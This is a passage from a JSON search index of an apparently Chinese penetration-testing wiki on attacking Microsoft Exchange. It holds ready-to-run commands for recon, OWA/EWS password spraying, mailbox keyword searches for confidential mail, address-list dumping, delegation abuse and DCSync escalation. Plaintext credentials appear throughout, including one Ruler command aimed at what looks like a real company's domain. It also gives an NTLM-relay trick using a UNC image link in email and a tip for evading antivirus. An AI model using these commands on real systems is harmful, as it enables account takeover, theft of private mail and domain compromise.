\u5728\u6e17\u900f\u4e2d\u53ef\u4ee5\u901a\u8fc7GAL\u6765\u83b7\u53d6\u6240\u6709\u90ae\u7bb1\u5730\u5740\u3002","title":"GAL"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange_2","text":"\u5728\u6e17\u900f\u4e2d\u8be5\u5982\u4f55\u53d1\u73b0\u54ea\u4e00\u53f0\u673a\u5668\u662fEXCHANGE\u670d\u52a1\u5668\u5462\uff1f \u5728exchange server 2019 \u4e2d\uff0c\u7531\u4e8e\u53ea\u7ec6\u5206\u4e86\u90ae\u7bb1\u670d\u52a1\u5668\u548c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668\uff0c\u6240\u4ee5\u5f00\u653e\u4e86\u5982OWA\uff0cECP\u7b49\u63a5\u53e3\u7684\u670d\u52a1\u5668\u5373\u4e3a\u90ae\u7bb1\u670d\u52a1\u5668\u3002","title":"EXCHANGE\u4fe1\u606f\u641c\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_5","text":"","title":"\u53d1\u73b0"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_6","text":"exchange\u4f1a\u5bf9\u5916\u66b4\u9732\u63a5\u53e3\u5982OWA,ECP\u7b49\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u7aef\u53e3\u7279\u5f81\u6765\u53d1\u73b0exchange\u3002 exchange \u63a5\u53e3\u4f1a\u66b4\u9732\u572880\u7aef\u53e3\uff0c\u540c\u65f625/587/2525\u7b49\u7aef\u53e3\u4e0a\u4f1a\u6709SMTP\u670d\u52a1\u3002","title":"\u7aef\u53e3\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#spn","text":"\u5982\u679c\u5df2\u7ecf\u6253\u5165\u57df\u4e2d\uff0c\u60f3\u5feb\u901f\u7684\u5b9a\u4f4d\u5230exchange\u670d\u52a1\u5668\uff0c\u53ea\u9700\u8981\u67e5\u8be2\u57df\u4e2dspn\u670d\u52a1\u5373\u53ef\u3002 setspn -q */*","title":"spn"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_7","text":"https://autodiscover.domain.com/autodiscover/autodiscover.xml https://owa.domian/owa/ https://mail.domain.com/ https://webmail.domain.com/","title":"\u7279\u6b8a\u57df\u540d"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_8","text":"/autoDiscover/ \u81eaExchange Server 2007\u5f00\u59cb\u63a8\u51fa\u7684\u4e00\u9879\u81ea\u52a8\u670d\u52a1\uff0c\u7528\u4e8e\u81ea\u52a8\u914d\u7f6e\u7528\u6237\u5728Outlook\u4e2d\u90ae\u7bb1\u7684\u76f8\u5173\u8bbe\u7f6e\uff0c\u7b80\u5316\u7528\u6237\u767b\u9646\u4f7f\u7528\u90ae\u7bb1\u7684\u6d41\u7a0b\u3002 /ecp/\u201cExchange Control Panel\u201d Exchange\u7ba1\u7406\u4e2d\u5fc3\uff0c\u7ba1\u7406\u5458\u7528\u4e8e\u7ba1\u7406\u7ec4\u7ec7\u4e2d\u7684Exchange\u7684Web\u63a7\u5236\u53f0 /eWS/\u201cExchange Web Services\u201d Exchange Web Service,\u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u57fa\u4e8eHTTP\u7684SOAP\u4ea4\u4e92 /mapi/ Outlook\u8fde\u63a5Exchange\u7684\u9ed8\u8ba4\u65b9\u5f0f\uff0c\u57282013\u548c2013\u4e4b\u540e\u5f00\u59cb\u4f7f\u7528\uff0c2010 sp2\u540c\u6837\u652f\u6301 /microsoft-Server-ActiveSync/ \u7528\u4e8e\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u7535\u5b50\u90ae\u4ef6 /OAB/\u201cOffline Address Book\u201d \u7528\u4e8e\u4e3aOutlook\u5ba2\u6237\u7aef\u63d0\u4f9b\u5730\u5740\u7c3f\u7684\u526f\u672c\uff0c\u51cf\u8f7bExchange\u7684\u8d1f\u62c5 /owa/\u201cOutlook Web APP\u201d Exchange owa \u63a5\u53e3\uff0c\u7528\u4e8e\u901a\u8fc7web\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u90ae\u4ef6\u3001\u65e5\u5386\u3001\u4efb\u52a1\u548c\u8054\u7cfb\u4eba\u7b49 /powerShell/ \u7528\u4e8e\u670d\u52a1\u5668\u7ba1\u7406\u7684Exchange\u7ba1\u7406\u63a7\u5236\u53f0 /Rpc/ \u65e9\u671f\u7684Outlook\u8fd8\u4f7f\u7528\u79f0\u4e3aOutlook Anywhere\u7684RPC\u4ea4\u4e92","title":"\u5bfb\u627e\u63a5\u53e3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_9","text":"https://github.com/vysec/checkO365","title":"\u5de5\u5177\u4f7f\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_10","text":"\u53ef\u4ee5\u901a\u8fc7OWA,ECP\u7684HTML\u6e90\u4ee3\u7801\u786e\u5b9a\u7248\u672c \u6e90\u4ee3\u7801\u641c\u7d22favicon.ico \u53ef\u4ee5\u770b\u5230\u4e00\u4e32\u6570\u5b57 15.0.1130,\u8fd9\u662fexchange\u5177\u4f53\u7248\u672c\u53f7\uff0c\u5230\u8fd9\u91cc\u67e5\u5c31\u884c\u4e86 https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019","title":"\u7248\u672c\u786e\u5b9a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#ip","text":"\u6293\u5305\u4ee5\u4e0b\u63a5\u53e3\u5305\uff0c\u5c06HTTP\u7248\u672c\u6539\u4e3a1.0\uff0c\u5e76\u5220\u9664HOST\u5934\uff0c\u5c31\u4f1a\u66b4\u9732exchange ip\uff0c\u6709\u65f6\u4f1a\u66b4\u9732\u5185\u7f51IP /Microsoft-Server-ActiveSync/default.eas /Microsoft-Server-ActiveSync /Autodiscover/Autodiscover.xml /Autodiscover /Exchange /Rpc /EWS/Exchange.asmx /EWS/Services.wsdl /EWS /ecp /OAB /OWA /aspnet_client /PowerShell \u60f3\u8981\u66f4\u65b9\u4fbf\u7684\u8bdd\uff0c\u53ef\u4ee5\u7528msf\u7684\u6a21\u5757\u81ea\u52a8\u641c\u96c6 use auxiliary/scanner/http/owa_iis_internal_ip","title":"IP\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange_3","text":"\u5f53\u6211\u4eec\u5bf9exchange\u670d\u52a1\u5668\u8fdb\u884cNTLM\u8d28\u8be2\u65f6,\u5728\u670d\u52a1\u5668\u8fd4\u56dechallenge\u65f6\u540c\u65f6\u4f1a\u8fd4\u56de\u57df\u4fe1\u606f\uff0c\u673a\u5668\u540d\u7b49\u4fe1\u606f\u3002\u4ee5\u6b64\u4e3a\u57fa\u7840\u53ef\u4ee5\u5bf9exchange\u8fdb\u884c\u670d\u52a1\u5668\u4fe1\u606f\u641c\u96c6 \u76f4\u63a5nmap nmap host -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll -Pn","title":"\u6cc4\u9732exchange\u670d\u52a1\u5668\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange_4","text":"","title":"EXCHANGE \u5916\u56f4\u6253\u70b9"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#proxyshell","text":"\u00b7 Exchange Server 2013 Versions < Builder 15.0.1497.012 \u00b7 Exchange Server 2016 CU18 < Builder 15.1.2106.013 \u00b7 Exchange Server 2016 CU19 < Builder 15.1.2176.009 \u00b7 Exchange Server 2019 CU7 < Builder 15.2.0721.013 https://github.com/dmaasland/proxyshell-poc.git https://github.com/horizon3ai/proxyshell","title":"proxyshell \u547d\u4ee4\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_11","text":"\u63a5\u89e6\u5230exchange\u7684\u7b2c\u4e00\u6b65\u81ea\u7136\u662f\u63a5\u89e6\u5230\u5b83\u7684\u63a5\u53e3\u670d\u52a1\u5982OWA,ECP\u7b49\u3002 \u7531\u4e8e\u662f\u767b\u5f55\u6846\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u7528\u7206\u7834\u6765\u8fdb\u884c\u653b\u51fb\u3002\u901a\u5e38\u60c5\u51b5\u4e0bEXCHANGE\u4e0d\u9650\u5236\u5927\u5b57\u5178\u7206\u7834\u3002 \u5e38\u89c1\u53ef\u7206\u7834\u63a5\u53e3 /Autodiscover/Autodiscover.xml # \u81ea Exchange Server 2007 \u5f00\u59cb\u63a8\u51fa\u7684\u4e00\u9879\u81ea\u52a8\u670d\u52a1,\u7528\u4e8e\u81ea\u52a8\u914d\u7f6e\u7528\u6237\u5728Outlook\u4e2d\u90ae\u7bb1\u7684\u76f8\u5173\u8bbe\u7f6e,\u7b80\u5316\u7528\u6237\u767b\u5f55\u4f7f\u7528\u90ae\u7bb1\u7684\u6d41\u7a0b\u3002 /Microsoft-Server-ActiveSync/default.eas /Microsoft-Server-ActiveSync # \u7528\u4e8e\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u7535\u5b50\u90ae\u4ef6 /Autodiscover /Rpc/ # \u65e9\u671f\u7684 Outlook \u8fd8\u4f7f\u7528\u79f0\u4e3a Outlook Anywhere \u7684 RPC \u4ea4\u4e92 /EWS/Exchange.asmx /EWS/Services.wsdl /EWS/ # Exchange Web Service,\u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u57fa\u4e8eHTTP\u7684SOAP\u4ea4\u4e92 /OAB/ # \u7528\u4e8e\u4e3aOutlook\u5ba2\u6237\u7aef\u63d0\u4f9b\u5730\u5740\u7c3f\u7684\u526f\u672c,\u51cf\u8f7b Exchange \u7684\u8d1f\u62c5 /owa # Exchange owa \u63a5\u53e3,\u7528\u4e8e\u901a\u8fc7web\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u90ae\u4ef6\u3001\u65e5\u5386\u3001\u4efb\u52a1\u548c\u8054\u7cfb\u4eba\u7b49 /ecp # Exchange \u7ba1\u7406\u4e2d\u5fc3,\u7ba1\u7406\u5458\u7528\u4e8e\u7ba1\u7406\u7ec4\u7ec7\u4e2d\u7684Exchange \u7684Web\u63a7\u5236\u53f0 /Mapi # Outlook\u8fde\u63a5 Exchange \u7684\u9ed8\u8ba4\u65b9\u5f0f,\u57282013\u548c2013\u4e4b\u540e\u5f00\u59cb\u4f7f\u7528,2010 sp2\u540c\u6837\u652f\u6301 /powershell # \u7528\u4e8e\u670d\u52a1\u5668\u7ba1\u7406\u7684 Exchange \u7ba1\u7406\u63a7\u5236\u53f0 \u7206\u7834\u6bd4\u8f83\u5b9e\u7528\u7684\u5de5\u5177\u6709Eburst\u548cRuler https://github.com/grayddq/EBurst \uff08py\uff09 https://github.com/sensepost/ruler \uff08exe\uff09 ruler\u7531\u4e8ewindows\u7248\u7684\u663e\u793a\u4f3c\u4e4e\u6709\u70b9\u95ee\u817f\uff0c\u8fd9\u91cc\u7528\u7684linux\u7248\u672c autodiscover \u7206\u7834\u7684\u539f\u7406\u662f\uff0c\u8bbf\u95eeautodiscover\u65f6\u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u8ba4\u8bc1\u6846\uff0c\u5f53\u8f93\u5165\u6b63\u786e\u7684\u51ed\u8bc1\u540e\u5219\u4f1a\u663e\u793aXML\u6587\u6863\u5185\u5bb9\u3002 ps\\://github.com/dafthack/MailSniper \uff08ps1\uff09 \u4e0b\u9762\u7684\u662f\u5bc6\u7801\u55b7\u6d12\u7684\u653b\u51fb\u65b9\u5f0f\uff0c-Password\u9879\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8bb0\u5f55password\u7684\u5b57\u5178txt \u5bf9OWA\u8fdb\u884c\u7206\u7834 Import-Module .\\MailSniper.ps1 Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose \u5bf9EWS\u8fdb\u884c\u7206\u7834 Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose","title":"\u7206\u7834"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange_5","text":"","title":"EXCHANGE \u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_12","text":"\u6211\u4eec\u83b7\u53d6\u4e00\u4e2aexchange\u7528\u6237\u4ee5\u540e\uff0c\u53ef\u4ee5\u5bf9\u90ae\u4ef6\u5217\u8868\u8fdb\u884c\u68c0\u7d22\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u65b9\u4fbf\u4e0b\u4e00\u6b65\u6e17\u900f MailSniper \u53ef\u4ee5\u5b8c\u6210\u8fd9\u4e2a\u4efb\u52a1\uff0c\u4f46\u662f\u8fd9\u4e2a\u5de5\u5177\u611f\u89c9\u88ab\u6740\u7684\u6bd4\u8f83\u4e25\u91cd\uff0c\u53ef\u4ee5\u8bd5\u7740\u4fee\u6539\u4e00\u4e0b\u51fd\u6570\u540d\u53d8\u91cf\u540d\u5565\u7684\u514d\u514d\u6740\u3002 \u68c0\u7d22\u6307\u5b9a\u7528\u6237 \u68c0\u7d22rengan@const.com\u7684 \u6536\u4ef6\u7bb1\u6587\u4ef6\u5939\u91cc\u7684 \u5185\u5bb9\u542b\u6709\u673a\u5bc6\u7684 \u90ae\u4ef6\uff0c\u5728\u542f\u7528remote\u53c2\u6570\u540e\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8f93\u5165\u6846\u8f93\u5165\u90ae\u7bb1\u7968\u636e Invoke-SelfSearch -Mailbox rengan@const.com -Terms *\u673a\u5bc6* -Folder \u6536\u4ef6\u7bb1 -ExchangeVersion Exchange2013_SP1 -remote -OutputCsv a.csv \u53ef\u4ee5\u53d1\u73b0\u5728\u4e2d\u6587\u7684exchange\u4e0b\uff0c\u7528\u6237\u7684\u90ae\u4ef6\u4e00\u822c\u5b58\u653e\u4e8e\"\"\u6536\u4ef6\u7bb1\"\"\u6587\u4ef6\u5939\uff0c\u800c\u5bf9\u4e8e\u82f1\u6587\u5219\u662f\"inbox\"","title":"\u90ae\u4ef6\u5185\u5bb9\u68c0\u7d22"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_13","text":"","title":"\u83b7\u53d6\u5168\u5c40\u5730\u5740\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#mailsniper","text":"\u4f9d\u65e7\u901a\u8fc7MailSniper \u5b9e\u73b0\uff0c\u5728\u6211\u4eec\u83b7\u5f97\u4e00\u4e2a\u5408\u6cd5\u7528\u6237\u7684\u51ed\u636e\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u83b7\u53d6\u5168\u5c40\u5730\u5740\u8868\u6765\u83b7\u53d6\u6240\u6709\u90ae\u7bb1\u5730\u5740\u3002 Get-GlobalAddressList -ExchHostname Ex -UserName rengan -ExchangeVersion Exchange2013_SP1 -Password ganren@123456","title":"\u901a\u7528\u65b9\u6848MailSniper"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_14","text":"Import-PSSession\u662f\u81ea\u5e26\u7684 $User = \"test\\administrator\" $Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential Import-PSSession $Session -AllowClobber \u67e5\u770bPSSession\uff1a Get-PSSession \u65ad\u5f00PSSession\uff1a Remove-PSSession \\$Session \u6d4b\u8bd5\u547d\u4ee4(\u83b7\u5f97\u6240\u6709\u90ae\u7bb1\u7528\u6237): Get-Mailbox","title":"\u5728\u57df\u5185\u8fdb\u884c\u5bfc\u51fa"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#ruler","text":".\\ruler-win64.exe -e idm@chinaexpressair.com -p Sys@123456 --url https://autodiscover.chinaexpressair.com/autodiscover/autodiscover.xml abk list","title":"ruler\u5bfc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_15","text":"\u4e00\u4e2a\u7528\u6237\u7684\u6587\u4ef6\u5939\u662f\u53ef\u4ee5\u7ed9\u5176\u4ed6\u7528\u6237\u6743\u9650\u7684\u3002 \u70b9\u51fb\u6b64\u5904\u7684\u6743\u9650\uff0c\u6765\u5230\u4ee5\u4e0b\u754c\u9762\uff0c\u8fd9\u91cc\u7684\u9ed8\u8ba4\u5373 \u6240\u6709\u7528\u6237(everyone) \u7684\u5bf9\u6b64\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u6211\u8fd9\u91cc\u662f\u628a\u6743\u9650\u7ed9\u7684\u5f88\u9ad8 \u5b9e\u6218\u4e2d\u4e5f\u53ef\u80fd\u4f1a\u9047\u5230\u7528\u6237A\u5bf9\u7528\u6237B\u7684\u6536\u4ef6\u7bb1\u6709\u8bfb\u5199\u6743\u9650\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u83b7\u53d6\u7528\u6237A\u7684\u51ed\u636e\u540e\u53ef\u4ee5\u8fdb\u800c\u8bfb\u53d6\u7528\u6237B\u7684\u6536\u4ef6\u7bb1\u3002 \u7528MailSniper \u5b9e\u73b0 Invoke-OpenInboxFinder -ExchangeVersion Exchange2013_SP1 -ExchHostname ex.const.com -EmailList .\\user.txt -remote \u65e2\u7136\u8fd9\u91cc\u5bf9administrator\u7684\u6536\u4ef6\u7bb1\u53ef\u8bfb\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528invoke-selfsearch \u8fdb\u884c\u8be6\u7ec6\u7684\u90ae\u4ef6\u68c0\u7d22\u4e86\u3002","title":"\u67e5\u627e\u5b58\u5728\u7f3a\u9677\u7684\u7528\u6237\u90ae\u7bb1\u6743\u9650\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange_6","text":"exchange\u5b89\u88c5\u540e\u4f1a\u5728AD\u4e0a\u751f\u6210\u4e24\u4e2a\u5bb9\u5668 \u5176\u4e2dexchange windows permissions\u7ec4\u7684\u7528\u6237\u62e5\u6709writeDACL\u6743\u9650\uff0c Exchange Trusted Subsystem \u662f Exchange Windows Permission \u7684\u6210\u5458\uff0c\u80fd\u7ee7\u627fwritedacl\u6743\u9650\uff0c\u6709\u8fd9\u4e2a\u6743\u9650\u540e\u5c31\u80fd\u4f7f\u7528dcsync\u5bfc\u51fa\u6240\u6709\u7528\u6237hash\u3002 \u5176\u4e2dexchange trusted subsystem\u7ec4\u751a\u81f3\u53ef\u80fd\u6709\u7ee7\u627f\u81eaadministrators\u7ec4\u7684\u6743\u9650\u3002 \u540c\u65f6\uff0c\u5728\u5b89\u88c5exchange\u540e\u8fd8\u4f1a\u751f\u6210\u4e00\u4e2a\u7ec4Organization Management\uff0c\u8fd9\u4e2a\u7ec4\u53ef\u4ee5\u4fee\u6539\u5176\u4ed6exchange\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff0c\u6240\u4ee5\u5f53\u7136\u4e5f\u53ef\u4ee5\u4fee\u6539Exchange Trusted Subsystem\u7ec4\u7684\u6210\u5458\u4fe1\u606f\uff0c\u6bd4\u5982\u5411\u91cc\u9762\u52a0\u4e00\u4e2a\u4ee5\u83b7\u5f97\u7684\u7528\u6237\u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u53ea\u8981\u83b7\u5f97Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,\u5c31\u53ef\u4ee5\u901a\u8fc7dcsync\u6765\u83b7\u53d6\u6574\u4e2a\u57df\u6743\u9650\u3002 \u5f53\u7136\uff0c\u60f3\u83b7\u5f97\u4e0a\u8ff0\u7ec4\u7528\u6237\u6743\u9650\uff0c\u8fd8\u662f\u4e0d\u592a\u5bb9\u6613\u7684\u3002","title":"\u901a\u8fc7exchange\u7528\u6237\u7ec4\u8fdb\u884c\u57df\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#ntlm-relay","text":"\u7528exchange\u4e5f\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8fdb\u884cNTLM relay\uff1a\u7ed9\u7528\u6237\u53d1\u4e00\u5c01\u90ae\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u7684\u56fe\u7247\u94fe\u63a5\u5f62\u5982 \\\\10.10.10.1\\a.jpg\uff0c\u7528\u6237\u6536\u5230\u90ae\u4ef6\u540e\u5219\u4f1a\u541110.10.10.1\u53d1\u9001NTLM\u8d28\u8be2\uff0c\u4ece\u800c\u9020\u6210NTLM relay\u3002 \u5176\u5b9eEXCHANGE \u5f88\u591aCVE \u90fd\u662f\u4e0eNTLM RELAY \u6302\u94a9\u7684\uff0c\u5982 CVE-2018-8581 \uff0c CVE-2020-17141 \uff0c CVE-2020-17143 \uff0c CVE-2019-1040","title":"NTLM 